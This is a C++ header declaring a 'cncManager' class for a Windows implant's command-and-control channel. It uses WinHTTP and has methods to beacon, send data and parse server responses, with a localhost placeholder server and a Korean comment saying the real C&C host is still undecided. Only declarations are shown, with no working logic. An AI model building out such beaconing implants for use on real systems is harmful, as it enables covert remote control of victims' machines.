#pragma once
#include <Windows.h>
#include "DDproto.h"
#include <winhttp.h>

class cncManager
{
private:
	LPCWSTR
		/* 일단 C&C 정해지기 전이라 테스트용*/
		server = L"127.0.0.1",
		index = L"/tests";

	HINTERNET
		hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	BOOL bResults = FALSE;

public:
	cncManager();
	cncManager(LPCWSTR server);
	~cncManager();
	void sendHttpRequest(LPVOID data, DWORD dlen);
	void sendBeacon();
	void responseParser(UCHAR* response, DWORD len);

};
